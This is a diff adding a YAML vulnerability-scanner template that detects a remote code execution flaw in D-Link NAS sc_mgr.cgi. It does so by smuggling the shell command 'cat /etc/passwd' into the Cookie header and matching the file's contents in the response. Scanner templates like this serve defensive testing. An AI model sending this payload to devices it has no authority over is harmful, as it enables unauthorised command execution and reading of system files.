@@ -1,0 +1,28 @@
+id: d-link-nas-sc-mgr-cgi-rce
+info:
+  name: D-Link NAS sc_mgr.cgi Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce,d-link
+http:
+  - raw:
+      - |
+        GET /cgi-bin/sc_mgr.cgi?cmd=SC_Get_Info HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: username=mopfdfsewo'& cat /etc/passwd & echo 'mopfdfsewo;
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin"
+          - "mopfdfsewo"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
